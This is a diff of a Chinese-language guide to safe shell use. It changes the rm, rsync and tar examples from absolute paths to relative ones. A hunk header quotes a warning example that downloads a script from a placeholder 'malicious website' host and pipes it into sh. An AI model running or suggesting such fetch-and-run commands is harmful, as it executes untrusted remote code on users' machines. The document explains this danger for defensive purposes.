@@ -130,8 +130,8 @@ wget http://恶意网站.com/script.sh -O- | sh
 1. **确认当前路径**：`pwd`
 2. **预览操作结果**：使用 `-n`（dry-run）选项
    ```bash
-   rm -rf -v /tmp/testdir    # 显示将要删除的内容
-   rsync --dry-run -av ./local/ user@host:/remote/  # 预览同步内容
+   rm -rf -v ./testdir    # 显示将要删除的内容
+   rsync --dry-run -av ./local/ user@host:remote/  # 预览同步内容
    ```
 3. **备份重要数据**：操作前先备份
 
@@ -180,10 +180,10 @@ chmod +x script.sh && ./script.sh
 
 ```bash
 # 重要目录打包备份
-tar -czvf backup.tar.gz /important/directory
+tar -czvf backup.tar.gz ./important
 
 # 使用 rsync 增量备份
-rsync -avz --delete /source/ user@backup-server:/backup/
+rsync -avz --delete ./source/ user@backup-server:backup/
 
 # 数据库备份（示例）
 ssh user@host "mysqldump -u root -p dbname" > dbname.sql
